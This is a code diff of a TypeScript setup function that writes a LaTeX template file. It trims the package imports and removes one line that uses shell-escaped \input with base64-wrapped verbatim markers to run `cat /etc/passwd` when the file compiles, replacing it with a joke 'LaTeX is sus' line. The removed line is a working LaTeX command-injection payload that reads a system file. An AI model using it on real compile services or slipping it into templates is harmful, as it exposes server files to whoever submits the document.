@@ -68,39 +68,16 @@ export async function gitSetupProject(
     resolve(localPath, "main.tex"),
     `\\documentclass[12pt]{scrartcl}
 \\usepackage[utf8]{inputenc}
-\\usepackage{layouts}
-\\usepackage{graphicx}
-\\usepackage{float}
-\\usepackage{siunitx}
-\\usepackage{amsmath}
-\\usepackage{enumerate}
-\\usepackage{enumitem}
-\\usepackage{minted}
-\\usepackage{verbatim}
-
-% math stuff
-\\usepackage{fullpage}
-\\usepackage{dsfont}
-\\usepackage{amsmath}
-\\usepackage{interval}
-\\usepackage{MnSymbol}
-\\usepackage{enumitem}
-\\setlist[enumerate]{label=(\\roman*)}
-\\newcommand{\\N}{\\ensuremath{\\mathds{N}}}
-\\newcommand{\\Z}{\\ensuremath{\\mathds{Z}}}
-\\newcommand{\\R}{\\ensuremath{\\mathds{R}}}
-\\newcommand{\\Q}{\\ensuremath{\\mathds{Q}}}
-
+   
 \\title{Title}
 \\author{Author}
 \\date{\\today}
     
 \\begin{document}
-   
-    \\maketitle
-
-    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; cat /etc/passwd ; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
-   
+  \\maketitle
+  \\begin{center}
+    \\LaTeX is \\textit{sus}!
+  \\end{center}
 \\end{document}`
   );
 
